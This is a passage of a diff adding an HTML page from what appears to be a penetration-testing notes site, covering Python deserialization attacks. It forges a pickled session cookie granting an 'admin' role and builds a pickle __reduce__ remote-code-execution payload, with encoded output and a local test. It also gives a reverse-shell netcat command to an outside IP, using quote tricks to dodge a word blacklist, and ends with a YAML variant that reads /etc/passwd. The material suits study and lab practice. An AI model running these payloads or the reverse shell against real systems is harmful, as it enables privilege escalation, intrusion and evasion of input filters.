+</span></span><span style="display:flex;"><span>        <span style="color:#75715e">#self.username, self.role = res.fetchone()</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#75715e">#con.close()</span>
+</span></span><span style="display:flex;"><span>        self<span style="color:#f92672">.</span>username <span style="color:#f92672">=</span> username
+</span></span><span style="display:flex;"><span>        self<span style="color:#f92672">.</span>role <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;admin&#39;</span></span></span></code></pre></div><p>Then, we can create our <code>exploit.py</code> where the <code>app.py</code> is with this content</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">import</span> util.auth
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>s <span style="color:#f92672">=</span> util<span style="color:#f92672">.</span>auth<span style="color:#f92672">.</span>Session(<span style="color:#e6db74">&#34;franz.mueller&#34;</span>)
+</span></span><span style="display:flex;"><span>c <span style="color:#f92672">=</span> util<span style="color:#f92672">.</span>auth<span style="color:#f92672">.</span>sessionToCookie(s)
+</span></span><span style="display:flex;"><span>print(c<span style="color:#f92672">.</span>decode())</span></span></code></pre></div><p>And we will test if it works locally using python command line</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>$ python3
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Python 3.10.7 <span style="color:#f92672">(</span>main, Oct  <span style="color:#ae81ff">1</span> 2022, 04:31:04<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>GCC 12.2.0<span style="color:#f92672">]</span> on linux
+</span></span><span style="display:flex;"><span>Type <span style="color:#e6db74">&#34;help&#34;</span>, <span style="color:#e6db74">&#34;copyright&#34;</span>, <span style="color:#e6db74">&#34;credits&#34;</span> or <span style="color:#e6db74">&#34;license&#34;</span> <span style="color:#66d9ef">for</span> more information.
+</span></span><span style="display:flex;"><span>&gt;&gt;&gt; import util.auth
+</span></span><span style="display:flex;"><span>&gt;&gt;&gt; s <span style="color:#f92672">=</span> util.auth.cookieToSession<span style="color:#f92672">(</span><span style="color:#e6db74">&#39;gASVRgAAAAAAAACMCXV...SNIP...b2xllIwFYWRtaW6UdWIu&#39;</span><span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>&gt;&gt;&gt; s.username 
+</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#39;attacker&#39;</span>
+</span></span><span style="display:flex;"><span>&gt;&gt;&gt; s.role
+</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#39;admin&#39;</span></span></span></code></pre></div><p>After we confirmed that it works, just change our cookie value to this base64 string and we should get elevated privilege</p>
+<h2 id="rce">RCE<a class="anchor" href="#rce">#</a></h2>
+<p>In the <a href="https://docs.python.org/3/library/pickle.html#object.__reduce__">documentation</a>, when unpickling objects, if the pickled object contains a definition for function <code>object.__reduce__()</code>, it will run it to restore the original object.
+Reading about <code>object.__reduce__()</code>, we see that it returns a tuple that contains:</p>
+<ul>
+<li>A <strong>callable object</strong> (function, class, etc) that will be called to create the initial version of the object.</li>
+<li>A <strong>tuple</strong> of arguments for the callable object.
+We can use <code>os.system()</code> to execute command and circumvent the word blacklist. Since <code>__reduce__</code> must also return a <strong>tuple</strong>, we pass <code>(&quot;ping -c 5 127.0.0.1&quot;,)</code> as argument to <code>os.system()</code></li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">import</span> pickle
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> base64
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> os
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">class</span> <span style="color:#a6e22e">RCE</span>:
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">__reduce__</span>(self):
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> os<span style="color:#f92672">.</span>system, (<span style="color:#e6db74">&#34;ping -c 5 127.0.0.1&#34;</span>,)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>r <span style="color:#f92672">=</span> RCE()
+</span></span><span style="display:flex;"><span>p <span style="color:#f92672">=</span> pickle<span style="color:#f92672">.</span>dumps(r)
+</span></span><span style="display:flex;"><span>b <span style="color:#f92672">=</span> base64<span style="color:#f92672">.</span>b64encode(p)
+</span></span><span style="display:flex;"><span>print(b<span style="color:#f92672">.</span>decode())</span></span></code></pre></div><p>Running the exploit, we got this:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>$ python3 ./exploit.py
+</span></span><span style="display:flex;"><span>gASVLgAAAAAAAACMBXBvc2l4lIwGc3lzdGVtlJOUjBNwaW5nIC1jIDUgMTI3LjAuMC4xlIWUUpQu</span></span></code></pre></div><p>Then we can test the exploit locally like this. Confirmed that it works</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>$ python3
+</span></span><span style="display:flex;"><span>Python 3.13.11 <span style="color:#f92672">(</span>main, Dec  <span style="color:#ae81ff">8</span> 2025, 11:43:54<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>GCC 15.2.0<span style="color:#f92672">]</span> on linux
+</span></span><span style="display:flex;"><span>Type <span style="color:#e6db74">&#34;help&#34;</span>, <span style="color:#e6db74">&#34;copyright&#34;</span>, <span style="color:#e6db74">&#34;credits&#34;</span> or <span style="color:#e6db74">&#34;license&#34;</span> <span style="color:#66d9ef">for</span> more information.
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>&gt;&gt;&gt; import util.auth
+</span></span><span style="display:flex;"><span>&gt;&gt;&gt; util.auth.cookieToSession<span style="color:#f92672">(</span><span style="color:#e6db74">&#39;gASVLgAAAAAAAACMBXBvc2l4lIwGc3lzdGVtlJOUjBNwaW5nIC1jIDUgMTI3LjAuMC4xlIWUUpQu&#39;</span><span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>PING 127.0.0.1 <span style="color:#f92672">(</span>127.0.0.1<span style="color:#f92672">)</span> 56<span style="color:#f92672">(</span>84<span style="color:#f92672">)</span> bytes of data.
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">64</span> bytes from 127.0.0.1: icmp_seq<span style="color:#f92672">=</span><span style="color:#ae81ff">1</span> ttl<span style="color:#f92672">=</span><span style="color:#ae81ff">64</span> time<span style="color:#f92672">=</span>0.342 ms
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">64</span> bytes from 127.0.0.1: icmp_seq<span style="color:#f92672">=</span><span style="color:#ae81ff">2</span> ttl<span style="color:#f92672">=</span><span style="color:#ae81ff">64</span> time<span style="color:#f92672">=</span>0.089 ms
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">64</span> bytes from 127.0.0.1: icmp_seq<span style="color:#f92672">=</span><span style="color:#ae81ff">3</span> ttl<span style="color:#f92672">=</span><span style="color:#ae81ff">64</span> time<span style="color:#f92672">=</span>0.068 ms
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">64</span> bytes from 127.0.0.1: icmp_seq<span style="color:#f92672">=</span><span style="color:#ae81ff">4</span> ttl<span style="color:#f92672">=</span><span style="color:#ae81ff">64</span> time<span style="color:#f92672">=</span>0.084 ms
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">64</span> bytes from 127.0.0.1: icmp_seq<span style="color:#f92672">=</span><span style="color:#ae81ff">5</span> ttl<span style="color:#f92672">=</span><span style="color:#ae81ff">64</span> time<span style="color:#f92672">=</span>0.102 ms
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>--- 127.0.0.1 ping statistics ---
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">5</span> packets transmitted, <span style="color:#ae81ff">5</span> received, 0% packet loss, time 4086ms
+</span></span><span style="display:flex;"><span>rtt min/avg/max/mdev <span style="color:#f92672">=</span> 0.068/0.137/0.342/0.103 ms
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0</span></span></span></code></pre></div><p>To execute a revshell command, we can execute this <code>n'c' -nv 10.10.14.151 9001 -e /bin''/bash</code>. The quote <code>'</code> has no effect when executing command</p>
+<h2 id="yaml">YAML<a class="anchor" href="#yaml">#</a></h2>
+<p>Same thing if webapp use <code>yaml</code> module instead of <code>pickle</code></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">import</span> yaml
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> subprocess
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">class</span> <span style="color:#a6e22e">RCE</span>():
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">__reduce__</span>(self):
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> subprocess<span style="color:#f92672">.</span>Popen([<span style="color:#e6db74">&#34;head&#34;</span>, <span style="color:#e6db74">&#34;/etc/passwd&#34;</span>])
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Serialize (Create the payload)</span>
+</span></span><span style="display:flex;"><span>r <span style="color:#f92672">=</span> RCE()
+</span></span><span style="display:flex;"><span>e <span style="color:#f92672">=</span> yaml<span style="color:#f92672">.</span>dump(r)
+</span></span><span style="display:flex;"><span>b <span style="color:#f92672">=</span> base64<span style="color:#f92672">.</span>b64encode(e)
+</span></span><span style="display:flex;"><span>print(b<span style="color:#f92672">.</span>decode())</span></span></code></pre></div></article>
+ 
+      
+
+      <footer class="book-footer">
+        
+  <div class="flex flex-wrap justify-between">
+
+<div>
+
+</div>
+
+<div>
+
+</div>
+
+</div>
+
+
+
+  
+
+
+
+  
+  
+  
+  <div class="flex flex-wrap justify-between">
+    <span>
+    
+      <a href="/spellbook/03.-enumeration/80443-tcp-http/whitebox/deserialization/php/" class="flex align-center">
+        <img src="/spellbook/icons/backward.svg" class="book-icon" alt="Backward" />
+        <span>Php</span>
+      </a>
+    
+    </span>
+    <span>
+    
+      <a href="/spellbook/03.-enumeration/80443-tcp-http/whitebox/decompilation-tools/" class="flex align-center">
+        <span>Decompilation Tools</span>
+        <img src="/spellbook/icons/forward.svg" class="book-icon" alt="Forward" />
+      </a>
+    
+    </span>
+  </div>
+  
+
+
+ 
+        
+  
+ 
+        
+        
+  
+ 
+        
+  
+  
+    <script>(function(){document.querySelectorAll("pre:has(code)").forEach(e=>{e.addEventListener("click",e.focus),e.addEventListener("copy",function(t){if(t.preventDefault(),navigator.clipboard){const t=window.getSelection().toString()||e.textContent;navigator.clipboard.writeText(t)}})})})()</script>
+  
+
+      </footer>
+
+      <label for="menu-control" class="hidden book-menu-overlay"></label>
+    </div>
+
+    
+  
+  <aside class="book-toc">
+    <div class="book-toc-content">
+      
+  
+<nav id="TableOfContents">
+  <ul>
+    <li><a href="#source-analysis">Source Analysis</a></li>
+    <li><a href="#privesc">Privesc</a></li>
+    <li><a href="#rce">RCE</a></li>
+    <li><a href="#yaml">YAML</a></li>
+  </ul>
+</nav>
+
+
+
+    </div>
+  </aside>
+  
+ 
+  </main>
+
+  
+</body>
+</html>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
